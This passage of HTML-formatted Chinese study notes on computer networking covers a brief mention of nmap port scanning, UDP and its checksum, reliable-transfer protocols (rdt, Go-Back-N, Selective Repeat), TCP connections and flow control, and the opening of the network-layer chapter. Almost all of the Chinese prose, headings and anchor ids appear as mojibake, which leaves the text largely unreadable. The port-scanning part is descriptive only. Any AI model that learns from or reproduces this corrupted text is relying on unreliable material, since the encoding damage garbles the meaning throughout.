title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h4><p>å¦‚æœæˆ‘ä»¬ç¡®å®šä¸€å°ä¸»æœºä¸Šæ‰“å¼€äº†ä¸€ä¸ªç«¯å£ï¼Œä¹Ÿè®¸å°±èƒ½å¤Ÿå°†è¯¥ç«¯å£æ˜ å°„åˆ°åœ¨è¯¥ä¸»æœºè¿è¡Œçš„ä¸€ä¸ªç‰¹å®šçš„åº”ç”¨ç¨‹åº.</p><p>æ”»å‡»è€…å¯ä»¥é€šè¿‡ç«¯å£å¯»æ‰¾å…·æœ‰å·²çŸ¥å®‰å…¨ç¼ºé™·çš„åº”ç”¨ç¨‹åº.</p><p>ä½¿ç”¨ <code>nmap</code> è¿™ä¸€ç¨‹åºæ¥æ‰«æç«¯å£.</p><p>nmap è¿”å›æ‰“å¼€çš„ï¼Œå…³é—­çš„æˆ–ä¸å¯è¾¾çš„ç«¯å£åˆ—è¡¨.</p><p>è¿è¡Œ nmap çš„ä¸»æœºèƒ½å¤Ÿå°è¯•æ‰«æå› ç‰¹ç½‘ä¸­ä»»ä½•åœ°æ–¹çš„ç›®çš„ä¸»æœº.</p><h3 id="3-Web-æœåŠ¡å™¨ä¸-TCP"><a href="#3-Web-æœåŠ¡å™¨ä¸-TCP" class="headerlink" title="3. Web æœåŠ¡å™¨ä¸ TCP"></a>3. Web æœåŠ¡å™¨ä¸ TCP</h3><h2 id="3-3-æ— è¿æ¥è¿è¾“-UDP"><a href="#3-3-æ— è¿æ¥è¿è¾“-UDP" class="headerlink" title="3.3 æ— è¿æ¥è¿è¾“: UDP"></a>3.3 æ— è¿æ¥è¿è¾“: UDP</h2><p>UDP åªæ˜¯åšäº†è¿è¾“åè®®èƒ½å¤Ÿåšçš„æœ€å°‘å·¥ä½œ.</p><p>ä½¿ç”¨ UDP æ—¶, åœ¨å‘é€æŠ¥æ–‡æ®µä¹‹å‰, å‘é€æ–¹å’Œæ¥å—æ–¹çš„è¿è¾“å±‚å®ä½“ä¹‹é—´æ²¡æœ‰æ¡æ‰‹. (å› æ­¤è¢«ç§°ä¸ºæ— è¿æ¥)</p><p>UDP ä»åº”ç”¨ç¨‹åºå¾—åˆ°æ•°æ®, é™„åŠ ä¸Šç”¨äºå¤šè·¯å¤ç”¨&#x2F;åˆ†è§£æœåŠ¡çš„æºå’Œç›®çš„çš„ç«¯å£å·å­—æ®µ, ä»¥åŠå…¶ä»–ä¸¤ä¸ªå°å­—æ®µ, ç„¶åå°†å½¢æˆçš„æŠ¥æ–‡æ®µäº¤ç»™ç½‘ç»œå±‚.</p><p>DNS æ˜¯ä¸€ä¸ªé€šå¸¸ä½¿ç”¨ UDP çš„åº”ç”¨å±‚åè®®çš„ä¾‹å­.</p><p>åœ¨æœ‰äº›æƒ…å†µä¸‹ä½¿ç”¨ UDP è€Œä¸æ˜¯ TCP çš„åŸå› :</p><ul><li>å®¹å¿ä¸€äº›æ•°æ®ä¸¢å¤±</li><li>æ— é¡»å»ºç«‹è¿æ¥, å‡å°‘æ—¶å»¶</li><li>æ— è¿æ¥çŠ¶æ€, ä¸ç”¨ç»´æŒä¸€äº›çŠ¶æ€ä¿¡æ¯</li><li>é¦–éƒ¨å¼€é”€å°</li></ul><p><img src="/../img/protocol_applications.png"></p><p>UDP ä¸­ç¼ºä¹æ‹¥å¡æ§åˆ¶ä¼šå¯¼è‡´ UDP å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä¹‹é—´çš„é«˜ä¸¢åŒ…ç‡, å¹¶æŒ¤è·¨ TCP ä¼šè¯.</p><h3 id="3-3-1-UDP-æŠ¥æ–‡æ®µç»“æ„"><a href="#3-3-1-UDP-æŠ¥æ–‡æ®µç»“æ„" class="headerlink" title="3.3.1 UDP æŠ¥æ–‡æ®µç»“æ„"></a>3.3.1 UDP æŠ¥æ–‡æ®µç»“æ„</h3><p><img src="/../img/structure_of_UDP_rep.png"></p><p>UDP çš„é¦–éƒ¨åªæœ‰ 4 ä¸ªå­—æ®µï¼Œæ¯ä¸ªå­—æ®µç”±ä¸¤ä¸ªå­—èŠ‚ç»„æˆ.</p><h3 id="3-3-2-UDP-æ£€éªŒå’Œ"><a href="#3-3-2-UDP-æ£€éªŒå’Œ" class="headerlink" title="3.3.2 UDP æ£€éªŒå’Œ"></a>3.3.2 UDP æ£€éªŒå’Œ</h3><p>UDP æ£€éªŒå’Œæä¾›äº†å·®é”™æ£€æµ‹åŠŸèƒ½. å³ç”¨äºç¡®å®šå½“ UDP æŠ¥æ–‡æ®µä»æºåˆ°è¾¾ç›®çš„åœ°ç§»åŠ¨æ—¶ï¼Œå…¶ä¸­çš„æ¯”ç‰¹æ˜¯å¦å‘ç”Ÿäº†æ”¹å˜ã€‚</p><p>ç¤ºä¾‹:</p><p><img src="/../img/check_add.png"></p><p>ä»è¿™é‡Œçœ‹å‡ºä¸ºä»€ä¹ˆå« â€œæ ¡éªŒå’Œâ€, â€œæ ¡éªŒâ€ è¡¨ç¤ºçš„æ˜¯åŠŸèƒ½ï¼Œâ€å’Œâ€ æ˜¯å°†å››ä¸ªå­—æ®µçš„æ¯”ç‰¹ç›¸åŠ .</p><p>åŠ æ³•æº¢å‡ºåä¼šæœ‰å›å·ï¼Œæ„æ€ä¸ºå¾€å›åŠ åˆ°ç¬¬ä¸€ä½ä¸Š.</p><p><img src="/../img/back_roll.png"></p><p>å†å°†å’Œå–åç .</p><p>è‹¥ 4 ä¸ªæ¯”ç‰¹çš„å’ŒåŠ ä¸Šæ ¡éªŒå’Œï¼Œç»“æœä¸º 1111111111111111, åˆ™æ²¡æœ‰å·®é”™ï¼Œåä¹‹.</p><p>è™½ç„¶ UDP æä¾›å·®é”™æ£€æµ‹ï¼Œä½†å®ƒå¯¹å·®é”™æ¢å¤æ— èƒ½ä¸ºåŠ›. UDP çš„æŸç§å®ç°åªæ˜¯ä¸¢å¼ƒå—æŸçš„æŠ¥æ–‡æ®µï¼Œå…¶ä»–å®ç°æ˜¯å°†å—æŸçš„æŠ¥æ–‡æ®µäº¤ç»™åº”ç”¨ç¨‹åºå¹¶ç»™å‡ºè­¦å‘Š.</p><h2 id="3-4-å¯é ä¼ è¾“åŸç†"><a href="#3-4-å¯é ä¼ è¾“åŸç†" class="headerlink" title="3.4 å¯é ä¼ è¾“åŸç†"></a>3.4 å¯é ä¼ è¾“åŸç†</h2><ul><li>ä¸æŸå, ä¸¢å¤±</li><li>æ­£ç¡®é¡ºåº</li></ul><h3 id="3-4-1-æ„é€ å¯é æ•°æ®ä¼ è¾“åè®®"><a href="#3-4-1-æ„é€ å¯é æ•°æ®ä¼ è¾“åè®®" class="headerlink" title="3.4.1 æ„é€ å¯é æ•°æ®ä¼ è¾“åè®®"></a>3.4.1 æ„é€ å¯é æ•°æ®ä¼ è¾“åè®®</h3><h4 id="1-ç»å®Œå…¨å¯é ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“-rdt1-0"><a href="#1-ç»å®Œå…¨å¯é ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“-rdt1-0" class="headerlink" title="1. ç»å®Œå…¨å¯é ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“: rdt1.0"></a>1. ç»å®Œå…¨å¯é ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“: rdt1.0</h4><h4 id="2-ç»å…·æœ‰æ¯”ç‰¹å·®é”™ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“-rdt2-0"><a href="#2-ç»å…·æœ‰æ¯”ç‰¹å·®é”™ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“-rdt2-0" class="headerlink" title="2. ç»å…·æœ‰æ¯”ç‰¹å·®é”™ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“: rdt2.0"></a>2. ç»å…·æœ‰æ¯”ç‰¹å·®é”™ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“: rdt2.0</h4><p><mark>è‡ªåŠ¨é‡ä¼ è¯·æ±‚ (Automatic Repeat reQuest, ARQ)</mark>  åè®®ï¼Œä½¿ç”¨ <mark>è‚¯å®šç¡®è®¤ ï¼ˆpositive acknowledgment (â€œOKâ€) ACK </mark> ä¸ <mark>å¦å®šç¡®è®¤ (negative acknowledgment) (â€œè¯·å†é‡å¤ä¸€è¾¹â€) NAK</mark> , ARQ åè®®ä¸­è¿˜éœ€è¦å¦å¤–ä¸‰ç§åè®®åŠŸèƒ½æ¥å¤„ç†å­˜åœ¨æ¯”ç‰¹å·®é”™çš„æƒ…å†µ:</p><ul><li>å·®é”™æ£€æµ‹</li><li>æ¥æ”¶æ–¹åé¦ˆ</li><li>é‡ä¼ </li></ul><p>åœ¨åˆ†ç»„ä¸­æ·»åŠ åºå· (sequence number) å¯ä»¥è®©æ¥æ”¶æ–¹çŸ¥é“è¿™æ˜¯æ–°çš„åˆ†ç»„è¿˜æ˜¯ä¸€æ¬¡é‡ä¼ .</p><h4 id="3-ç»å…·æœ‰æ¯”ç‰¹å·®é”™çš„ä¸¢åŒ…ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“-rdt3-0"><a href="#3-ç»å…·æœ‰æ¯”ç‰¹å·®é”™çš„ä¸¢åŒ…ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“-rdt3-0" class="headerlink" title="3. ç»å…·æœ‰æ¯”ç‰¹å·®é”™çš„ä¸¢åŒ…ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“: rdt3.0"></a>3. ç»å…·æœ‰æ¯”ç‰¹å·®é”™çš„ä¸¢åŒ…ä¿¡é“çš„å¯é æ•°æ®ä¼ è¾“: rdt3.0</h4><p>ç†æƒ³çš„åè®®åº”å°½å¯èƒ½å¿«åœ°ä»ä¸¢åŒ…ä¸­æ¢å¤è¿‡æ¥ï¼Œç­‰å¾…ä¸€ä¸ªæœ€åæƒ…å†µçš„æ—¶å»¶å¯èƒ½æ„å‘³ç€è¦ç­‰å¾…ä¸€æ®µè¾ƒé•¿çš„æ—¶é—´, ç›´åˆ°å¯åŠ¨å·®é”™æ¢å¤ä¸ºæ­¢.</p><p>å¯ä»¥é€šè¿‡è®¾ç½®ä¸€ä¸ªæ—¶é—´å€¼æ¥åˆ¤æ–­æ˜¯å¦ä¸¢åŒ…, å¦‚æœåœ¨è¿™ä¸ªæ—¶é—´å†…æ²¡æœ‰å—åˆ° ACK, åˆ™é‡ä¼ è¯¥åˆ†ç»„.</p><p>åˆ†ç»„åºå·åœ¨ 0 å’Œ 1 ä¹‹é—´äº¤æ›¿ï¼Œå› æ­¤ rdt3.0 æœ‰æ—¶è¢«ç§°ä¸º <mark>æ¯”ç‰¹äº¤æ¢åè®® (alternating-bit protocal)</mark> </p><p><img src="/../img/rdt3.0_ack_bit.png"></p><p>å¯é ä¼ è¾“åè®®çš„ä¸€äº›è¦ç‚¹:</p><ul><li>æ ¡éªŒå’Œ</li><li>åºå·</li><li>å®šæ—¶å™¨</li><li>è‚¯å®šç¡®è®¤</li><li>å¦å®šç¡®è®¤</li></ul><h3 id="3-4-2-æµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®®"><a href="#3-4-2-æµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®®" class="headerlink" title="3.4.2 æµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®®"></a>3.4.2 æµæ°´çº¿å¯é æ•°æ®ä¼ è¾“åè®®</h3><p>åœç­‰åè®®ï¼Œå°±æ˜¯åœ¨å‘é€ç¬¬äºŒä¸ªåˆ†ç»„ä¹‹å‰éœ€è¦å—åˆ°ç¬¬ä¸€ä¸ªåˆ†ç»„çš„ç¡®è®¤. è¿™ç§æ•ˆç‡è¾ƒä½.</p><p>ä»¥ä¸åœç­‰çš„æ–¹å¼è¿è¡Œï¼Œå…è®¸å‘é€æ–¹å‘é€å¤šä¸ªåˆ†ç»„è€Œæ— é¡»ç­‰å¾…ç¡®è®¤.</p><p><img src="/../img/pipline_tech_trans.png"></p><ul><li>å¢åŠ åºå·èŒƒå›´, æ¯ä¸ªåˆ†ç»„æœ‰å”¯ä¸€åºå·</li><li>ä¸¤ç«¯ç¼“å­˜åˆ†ç»„ï¼Œå‘é€ç«¯ç¼“å­˜å·²å‘é€ä½†æœªç¡®è®¤çš„åˆ†ç»„ (æ¯•ç«Ÿå¯èƒ½éœ€è¦é‡å‘), æ¥æ”¶æ–¹ç¼“å­˜å·²ç»æ­£ç¡®æ¥æ”¶çš„åˆ†ç»„ (æ”¶é½åå¥½æ’æ­£ç¡®çš„é¡ºåº)</li></ul><p>è§£å†³æµæ°´çº¿çš„å·®é”™æ¢å¤çš„ä¸¤ç§åŸºæœ¬æ–¹æ³•:</p><ul><li>å›é€€ N æ­¥ </li><li>é€‰æ‹©é‡ä¼ </li></ul><h3 id="3-4-3-å›é€€-N-æ­¥"><a href="#3-4-3-å›é€€-N-æ­¥" class="headerlink" title="3.4.3 å›é€€ N æ­¥"></a>3.4.3 å›é€€ N æ­¥</h3><p>å›é€€ N æ­¥åè®® (Go Back N protocol) å…è®¸å‘é€æ–¹å‘é€å¤šä¸ªåˆ†ç»„è€Œä¸éœ€ç­‰å¾…ç¡®è®¤.</p><p>å—é™äºæœªç¡®è®¤çš„åˆ†ç»„æ•°ä¸èƒ½è¶…è¿‡æŸä¸ªæœ€å¤§å…è®¸æ•° N.</p><p>é‚£äº›å·²è¢«å‘é€ä½†è¿˜æœªè¢«ç¡®è®¤çš„åˆ†ç»„çš„è®¸å¯åºå·èŒƒå›´å¯ä»¥è¢«çœ‹æˆæ˜¯ä¸€ä¸ªåœ¨åºå·èŒƒå›´å†…é•¿åº¦ä¸º N çš„çª—å£.</p><p>N å¸¸è¢«ç§°ä¸º <mark>çª—å£é•¿åº¦ (window size)</mark>, GBN åè®®å¸¸è¢«ç§°ä¸º <mark>æ»‘åŠ¨çª—å£åè®® (sliding-window protocal)</mark>.</p><p><img src="/../img/sliding_window_protocol.png"></p><p>æµé‡æ§åˆ¶æ˜¯å¯¹å‘é€æ–¹æ–½åŠ é™åˆ¶çš„åŸå› ä¹‹ä¸€.</p><p>ä¸€ä¸ªåˆ†ç»„çš„åºå·æ‰¿è½½åœ¨åˆ†ç»„é¦–éƒ¨çš„ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å­—æ®µä¸­.</p><p>å¦‚æœåˆ†ç»„åºå·å­—æ®µçš„æ¯”ç‰¹æ•°æ˜¯ k, åˆ™è¯¥åºå·èŒƒå›´æ˜¯ $[0, 2^k - 1]$.</p><p>æŒ‰åºä¼ è¾“.</p><h3 id="3-4-4-é€‰æ‹©é‡ä¼ "><a href="#3-4-4-é€‰æ‹©é‡ä¼ " class="headerlink" title="3.4.4 é€‰æ‹©é‡ä¼ "></a>3.4.4 é€‰æ‹©é‡ä¼ </h3><p>é€‰æ‹©é‡ä¼ ï¼ŒSelective Repeat protocol. è®©å‘é€æ–¹ä»…é‡ä¼ é‚£äº›ä»–æ€€ç–‘åœ¨æ¥æ”¶æ–¹å‡ºé”™çš„åˆ†ç»„ï¼Œè€Œé¿å…äº†ä¸å¿…è¦çš„é‡ä¼ .</p><p>SR æ¥æ”¶æ–¹å°†ç¡®è®¤ä¸€ä¸ªæ­£ç¡®æ¥æ”¶çš„åˆ†ç»„è€Œä¸ç®¡å…¶æ˜¯å¦æŒ‰åºã€‚å¤±åºçš„åˆ†ç»„å°†è¢«ç¼“å­˜ç›´åˆ°æ‰€æœ‰ä¸¢å¤±åˆ†ç»„çš†è¢«æ”¶åˆ°ä¸ºæ­¢ï¼Œè¿™æ—¶æ‰å¯ä»¥å°†ä¸€æ‰¹åˆ†ç»„æŒ‰åºäº¤ä»˜ç»™ä¸Šå±‚.</p><p>å‘é€æ–¹å’Œæ¥æ”¶æ–¹çš„çª—å£é—´ç¼ºä¹åŒæ­¥ä¼šäº§ç”Ÿä¸¥é‡çš„åæœ.</p><h2 id="3-5-é¢å‘è¿æ¥çš„è¿è¾“-TCP-Transmission-Control-Protocol"><a href="#3-5-é¢å‘è¿æ¥çš„è¿è¾“-TCP-Transmission-Control-Protocol" class="headerlink" title="3.5 é¢å‘è¿æ¥çš„è¿è¾“: TCP (Transmission Control Protocol)"></a>3.5 é¢å‘è¿æ¥çš„è¿è¾“: TCP (Transmission Control Protocol)</h2><h3 id="3-5-1-TCP-è¿æ¥"><a href="#3-5-1-TCP-è¿æ¥" class="headerlink" title="3.5.1 TCP è¿æ¥"></a>3.5.1 TCP è¿æ¥</h3><p>åœ¨ä¸€ä¸ªåº”ç”¨è¿›ç¨‹å¯ä»¥å¼€å§‹å‘å¦ä¸€ä¸ªåº”ç”¨è¿›ç¨‹å‘é€æ•°æ®ä¹‹å‰, è¿™ä¸¤ä¸ªè¿›ç¨‹å¿…é¡»å…ˆç›¸äº’ â€œæ¡æ‰‹â€.</p><p>TCP åè®®åªåœ¨ç«¯ç³»ç»Ÿä¸­è¿è¡Œ, è€Œä¸åœ¨ä¸­é—´çš„ç½‘ç»œå…ƒç´  (è·¯ç”±å™¨å’Œé“¾è·¯å±‚äº¤æ¢æœº) ä¸­è¿è¡Œ.</p><p>ä¸­é—´è·¯ç”±å™¨å¯¹ TCP è¿æ¥å®Œå…¨è§†è€Œä¸è§, å®ƒä»¬çœ‹åˆ°çš„æ˜¯æ•°æ®æŠ¥, è€Œä¸æ˜¯è¿æ¥.</p><p>TCP è¿æ¥ä¹Ÿæ€»æ˜¯ç‚¹å¯¹ç‚¹ (point-to-point) çš„, å³åœ¨å•ä¸ªå‘é€æ–¹ä¸å•ä¸ªæ¥å—æ–¹ä¹‹é—´çš„è¿æ¥.</p><p>ç¬¬ä¸‰æ¬¡æ¡æ‰‹æ—¶å‘é€äº†æœ‰æ•ˆè½½è·, å³åº”ç”¨å±‚æŠ¥æ–‡.</p><p>TCP ä¼šå…ˆå°†ä»åº”ç”¨å±‚æ¥çš„æ•°æ®æ”¾å…¥ <mark>å‘é€ç¼“å­˜ (send buffer)</mark> é‡Œ.</p><p>ä»ç¼“å­˜ä¸­å–å‡ºå¹¶æ”¾å…¥æŠ¥æ–‡æ®µä¸­çš„æ•°æ®æ•°é‡å—é™äºæœ€å¤§æŠ¥æ–‡æ®µé•¿åº¦ (Maximum Segment Size, MSS).</p><p>MSS é€šå¸¸æ ¹æ®æœ€å¤§ä¼ è¾“å•å…ƒ (Maximum Transmission Unit, MTU) æ¥è®¾ç½®.</p><p>å½“ TCP åœ¨å¦ä¸€ç«¯æ¥æ”¶åˆ°ä¸€ä¸ªæŠ¥æ–‡æ®µåã€‚è¯¥æŠ¥æ–‡æ®µçš„æ•°æ®å°±è¢«æ”¾å…¥è¯¥ TCP è¿æ¥çš„æ¥æ”¶ç¼“å­˜ä¸­. åº”ç”¨ç¨‹åºä»æ­¤ç¼“å­˜ä¸­è¯»å–æ•°æ®æµ.</p><p>TCP è¿æ¥çš„ç»„æˆåŒ…æ‹¬: ä¸€å°ä¸»æœºä¸Šçš„ç¼“å­˜ï¼Œå˜é‡å’Œä¸è¿›ç¨‹è¿æ¥çš„å¥—æ¥å­—, ä»¥åŠå¦ä¸€å°ä¸»æœºä¸Šçš„å¦ä¸€ç»„ç¼“å­˜ï¼Œå˜é‡å’Œä¸è¿›ç¨‹è¿æ¥çš„å¥—æ¥å­—.</p><h3 id="3-5-2-TCP-æŠ¥æ–‡ç»“æ„"><a href="#3-5-2-TCP-æŠ¥æ–‡ç»“æ„" class="headerlink" title="3.5.2 TCP æŠ¥æ–‡ç»“æ„"></a>3.5.2 TCP æŠ¥æ–‡ç»“æ„</h3><p><img src="/../img/TCP_segment_structure.png"></p><p>åŒæ ·ç”±é¦–éƒ¨å­—æ®µå’Œä¸€ä¸ªæ•°æ®å­—æ®µç»„æˆ.</p><p>é¦–éƒ¨åŒ…æ‹¬æºç«¯å£å·å’Œç›®çš„ç«¯å£å·. ä¹ŸåŒ…æ‹¬æ£€éªŒå’Œå­—æ®µ (checksum field).</p><h4 id="1-åºå·å’Œç¡®è®¤å·"><a href="#1-åºå·å’Œç¡®è®¤å·" class="headerlink" title="1. åºå·å’Œç¡®è®¤å·"></a>1. åºå·å’Œç¡®è®¤å·</h4><p>ä¸»æœº A å‘é€ä¸€ä¸ªæŠ¥æ–‡æ®µæ—¶, ä¸€ä¸ªæŠ¥æ–‡æ®µçš„åºå·æ˜¯è¯¥æŠ¥æ–‡æ®µé¦–å­—èŠ‚çš„å­—èŠ‚æµç¼–å·.</p><p>ä¸»æœº A å¡«å……è¿›æŠ¥æ–‡æ®µçš„ç¡®è®¤å·æ˜¯ä¸»æœº A æœŸæœ›ä»ä¸»æœº B æ”¶åˆ°çš„ä¸‹ä¸€å­—èŠ‚çš„åºå·.</p><p>åœ¨ä¸€æ¡ TCP è¿æ¥ä¸­æ”¶åˆ°å¤±åºæŠ¥æ–‡æ®µæ—¶ï¼Œæ¥æ”¶æ–¹ä¿ç•™å¤±åºçš„å­—èŠ‚ï¼Œå¹¶ç­‰å¾…ç¼ºå°‘çš„å­—èŠ‚ä»¥å¡«è¡¥è¯¥é—´éš™.</p><h4 id="2-Telnel-åºå·å’Œç¡®è®¤å·çš„ä¸€ä¸ªå­¦ä¹ æ¡ˆä¾‹"><a href="#2-Telnel-åºå·å’Œç¡®è®¤å·çš„ä¸€ä¸ªå­¦ä¹ æ¡ˆä¾‹" class="headerlink" title="2. Telnel: åºå·å’Œç¡®è®¤å·çš„ä¸€ä¸ªå­¦ä¹ æ¡ˆä¾‹"></a>2. Telnel: åºå·å’Œç¡®è®¤å·çš„ä¸€ä¸ªå­¦ä¹ æ¡ˆä¾‹</h4><p>Telnel è¿è¡Œåœ¨ TCP ä¸Šï¼Œè¢«è®¾è®¡æˆå¯åœ¨ä»»æ„ä¸€å¯¹ä¸»æœºä¹‹é—´å·¥ä½œ.</p><p>å‘èµ·ä¼šè¯çš„ä¸€èˆ¬æ˜¯å®¢æˆ·ç«¯.</p><h3 id="3-5-3-å¾€è¿”æ—¶é—´çš„ä¼°è®¡ä¸è¶…æ—¶"><a href="#3-5-3-å¾€è¿”æ—¶é—´çš„ä¼°è®¡ä¸è¶…æ—¶" class="headerlink" title="3.5.3 å¾€è¿”æ—¶é—´çš„ä¼°è®¡ä¸è¶…æ—¶"></a>3.5.3 å¾€è¿”æ—¶é—´çš„ä¼°è®¡ä¸è¶…æ—¶</h3><p>è¶…æ—¶æ—¶é—´é—´éš”é•¿åº¦çš„è®¾ç½®ï¼Œå¿…é¡»å¤§äºè¯¥è¿æ¥çš„å¾€è¿”æ—¶é—´ã€‚</p><h4 id="1-ä¼°è®¡å¾€è¿”æ—¶é—´"><a href="#1-ä¼°è®¡å¾€è¿”æ—¶é—´" class="headerlink" title="1. ä¼°è®¡å¾€è¿”æ—¶é—´"></a>1. ä¼°è®¡å¾€è¿”æ—¶é—´</h4><p>TCP ä¸æ˜¯ä¸ºæ¯ä¸€ä¸ªæŠ¥æ–‡æ®µéƒ½ä¼šä¼°è®¡ RTT(Round Trip Time).</p><p>åœ¨ä»»æ„æ—¶åˆ»ï¼ŒTCP ä»…ä¸ºä¸€ä¸ªå·²å‘é€çš„ä½†ç›®å‰å°šæœªè¢«ç¡®è®¤çš„æŠ¥æ–‡æ®µä¼°è®¡ SampleRTT, ä»è€Œäº§ç”Ÿä¸€ä¸ªæ¥è¿‘æ¯ä¸ª RTT çš„æ–° SampleRTT å€¼.</p><p>TCP å†³ä¸ä¸ºå·²è¢«é‡ä¼ çš„æŠ¥æ–‡æ®µè®¡ç®— SampleRTT, å®ƒä»…ä¸ºä¼ è¾“ä¸€æ¬¡çš„æŠ¥æ–‡æ®µæµ‹é‡ SampleRTT.</p><p>è®¡ç®—å…¬å¼è§ä¹¦.</p><h4 id="2-è®¾ç½®å’Œç®¡ç†é‡ä¼ è¶…æ—¶é—´éš”"><a href="#2-è®¾ç½®å’Œç®¡ç†é‡ä¼ è¶…æ—¶é—´éš”" class="headerlink" title="2. è®¾ç½®å’Œç®¡ç†é‡ä¼ è¶…æ—¶é—´éš”"></a>2. è®¾ç½®å’Œç®¡ç†é‡ä¼ è¶…æ—¶é—´éš”</h4><h3 id="3-5-4-å¯é æ•°æ®ä¼ è¾“"><a href="#3-5-4-å¯é æ•°æ®ä¼ è¾“" class="headerlink" title="3.5.4 å¯é æ•°æ®ä¼ è¾“"></a>3.5.4 å¯é æ•°æ®ä¼ è¾“</h3><p>TCP çš„å¯é æ•°æ®ä¼ è¾“æœåŠ¡ç¡®ä¿ä¸€ä¸ªè¿›ç¨‹ä»å…¶æ¥æ”¶ç¼“å­˜ä¸­è¯»å‡ºçš„æ•°æ®æµæ˜¯æ— æŸåï¼Œæ— é—´éš™ï¼Œéå†—ä½™å’ŒæŒ‰åºçš„æ•°æ®æµ.</p><p>åœ¨ TCP å‘é€æ–¹æœ‰ 3 ä¸ªä¸å‘é€å’Œé‡ä¼ æœ‰å…³çš„ä¸»è¦äº‹ä»¶:</p><ul><li>TCP ä»åº”ç”¨ç¨‹åºæ¥æ”¶æ•°æ®</li><li>å®šæ—¶å™¨è¶…æ—¶</li><li>æ”¶åˆ° ACK</li></ul><h3 id="3-5-5-æµé‡æ§åˆ¶"><a href="#3-5-5-æµé‡æ§åˆ¶" class="headerlink" title="3.5.5 æµé‡æ§åˆ¶"></a>3.5.5 æµé‡æ§åˆ¶</h3><p>TCP ä¸ºå®ƒçš„åº”ç”¨ç¨‹åºæä¾›äº†æµé‡æ§åˆ¶æœåŠ¡ (flow-control service) ä»¥æ¶ˆé™¤å‘é€æ–¹ä½¿æ¥æ”¶æ–¹ç¼“å­˜æº¢å‡ºçš„å¯èƒ½æ€§.</p><p>TCP é€šè¿‡è®©å‘é€æ–¹ç»´æŠ¤ä¸€ä¸ªç§°ä¸º <mark>æ¥æ”¶çª—å£ (receive window)</mark>  çš„å˜é‡æ¥æä¾›æµé‡æ§åˆ¶.</p><p>æ¥æ”¶çª—å£ç”¨äºå‘Šè¯‰å‘é€æ–¹ â€“ è¯¥æ¥æ”¶æ–¹è¿˜æœ‰å¤šå°‘å¯ç”¨çš„ç¼“å­˜ç©ºé—´.</p><h3 id="3-5-6-TCP-è¿æ¥ç®¡ç†"><a href="#3-5-6-TCP-è¿æ¥ç®¡ç†" class="headerlink" title="3.5.6 TCP è¿æ¥ç®¡ç†"></a>3.5.6 TCP è¿æ¥ç®¡ç†</h3><p>TCP è¿æ¥çš„å»ºç«‹ä¼šæ˜¾è‘—åœ°å¢åŠ äººä»¬æ„Ÿå—åˆ°çš„æ—¶å»¶.</p><h1 id="ç¬¬4ç« -ç½‘ç»œå±‚ï¼šæ•°æ®å¹³é¢"><a href="#ç¬¬4ç« -ç½‘ç»œå±‚ï¼šæ•°æ®å¹³é¢" class="headerlink" title="ç¬¬4ç«  ç½‘ç»œå±‚ï¼šæ•°æ®å¹³é¢"></a>ç¬¬4ç«  ç½‘ç»œå±‚ï¼šæ•°æ®å¹³é¢</h1><p>åœ¨ç½‘ç»œä¸­çš„æ¯ä¸€å°ä¸»æœºå’Œè·¯ç”±å™¨éƒ½æœ‰ä¸€ä¸ªç½‘ç»œå±‚éƒ¨åˆ†.</p><p>ç½‘ç»œå±‚èƒ½å¤Ÿè¢«åˆ†è§£ä¸ºä¸¤ä¸ªç›¸äº’ä½œç”¨çš„éƒ¨åˆ†:</p><ul><li>æ•°æ®å¹³é¢, ç½‘ç»œå±‚ä¸­æ¯å°è·¯ç”±å™¨çš„åŠŸèƒ½, åˆ°è¾¾è·¯ç”±å™¨è¾“å…¥é“¾è·¯ä¹‹ä¸€çš„æ•°æ®æŠ¥å¦‚ä½•è½¬å‘åˆ°è¯¥è·¯ç”±å™¨çš„è¾“å‡ºé“¾è·¯</li><li>æ§åˆ¶å¹³é¢, è·¯ç”±å™¨ä¹‹é—´çš„è·¯ç”±æ–¹å¼</li></ul><h2 id="4-1-ç½‘ç»œå±‚æ¦‚è¿°"><a href="#4-1-ç½‘ç»œå±‚æ¦‚è¿°" class="headerlink" title="4.1 ç½‘ç»œå±‚æ¦‚è¿°"></a>4.1 ç½‘ç»œå±‚æ¦‚è¿°</h2><p>æ¯å°è·¯ç”±å™¨çš„æ•°æ®å¹³é¢çš„ä¸»è¦ä½œç”¨æ˜¯ä»å…¶è¾“å…¥é“¾è·¯å‘å…¶è¾“å‡ºé“¾è·¯è½¬å‘æ•°æ®æŠ¥, æ§åˆ¶å¹³é¢çš„ä¸»è¦ä½œç”¨æ˜¯åè°ƒè¿™äº›æœ¬åœ°çš„æ¯è·¯ç”±å™¨è½¬å‘åŠ¨ä½œ, ä½¿å¾—æ•°æ®åŒ…æ²¿ç€æºå’Œç›®çš„åœ°ä¸»æœºä¹‹é—´çš„è·¯ç”±å™¨è·¯å¾„æœ€ç»ˆè¿›è¡Œç«¯åˆ°ç«¯ä¼ é€.</p><h3 id="4-1-1-è½¬å‘å’Œè·¯ç”±é€‰æ‹©-æ•°æ®å¹³é¢å’Œæ§åˆ¶å¹³é¢"><a href="#4-1-1-è½¬å‘å’Œè·¯ç”±é€‰æ‹©-æ•°æ®å¹³é¢å’Œæ§åˆ¶å¹³é¢" class="headerlink" title="4.1.1 è½¬å‘å’Œè·¯ç”±é€‰æ‹©: æ•°æ®å¹³é¢å’Œæ§åˆ¶å¹³é¢"></a>4.1.1 è½¬å‘å’Œè·¯ç”±é€‰æ‹©: æ•°æ®å¹³é¢å’Œæ§åˆ¶å¹³é¢</h3><p>ä¸¤ç§é‡è¦çš„ç½‘ç»œå±‚åŠŸèƒ½:</p><ul><li>è½¬å‘ (forwarding)</li><li>è·¯ç”±é€‰æ‹© (routing), è®¡ç®—è¿™äº›è·¯å¾„çš„ç®—æ³•ç§°ä¸ºè·¯ç”±é€‰æ‹©ç®—æ³• 